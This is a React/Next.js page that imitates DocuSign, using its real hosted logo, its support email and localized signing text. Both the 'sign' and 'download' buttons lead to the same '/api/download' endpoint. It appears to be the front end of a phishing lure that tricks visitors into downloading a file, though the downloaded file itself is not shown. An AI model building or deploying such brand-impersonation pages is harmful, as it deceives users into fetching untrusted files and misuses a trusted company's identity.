'use client'
import { useState, useEffect } from 'react'
import { translations } from '../lib/translations'

export default function Home() {
  const [lang, setLang] = useState('en')
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const testLang = params.get('lang')
    
    if (testLang && translations[testLang]) {
      setLang(testLang)
      setLoading(false)
    } else {
      fetch('/api/lang')
        .then(r => r.json())
        .then(data => {
          setLang(data.lang)
          setLoading(false)
        })
        .catch(() => setLoading(false))
    }
  }, [])

  const t = translations[lang]

  if (loading) return null

  return (
    <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '100vh', padding: '20px', fontFamily: 'Arial, sans-serif' }}>
      <img src="https://docucdn-a.akamaihd.net/olive/images/2.70.0/global-assets/ds-logo-default.svg" alt="DocuSign" style={{ width: '200px', marginBottom: '2rem' }} />
      <h1 style={{ fontSize: '2.5rem', marginBottom: '1rem' }}>{t.title}</h1>
      <p style={{ fontSize: '1.1rem', marginBottom: '2rem', textAlign: 'center', maxWidth: '600px' }}>
        {t.description}
      </p>
      <div style={{ display: 'flex', gap: '1rem', marginBottom: '2rem' }}>
        <a 
          href="/api/download" 
          style={{ 
            padding: '12px 24px', 
            backgroundColor: '#0070f3', 
            color: 'white', 
            borderRadius: '8px', 
            textDecoration: 'none',
            fontSize: '1rem'
          }}
        >
          {t.signButton}
        </a>
        <a 
          href="/api/download" 
          style={{ 
            padding: '12px 24px', 
            backgroundColor: '#6c757d', 
            color: 'white', 
            borderRadius: '8px', 
            textDecoration: 'none',
            fontSize: '1rem'
          }}
        >
          {t.downloadButton}
        </a>
      </div>
      <p style={{ fontSize: '0.9rem', color: '#666' }}>
        {t.support} <a href="mailto:support@docusign.com" style={{ color: '#0070f3' }}>support@docusign.com</a>.
      </p>
    </main>
  );
}
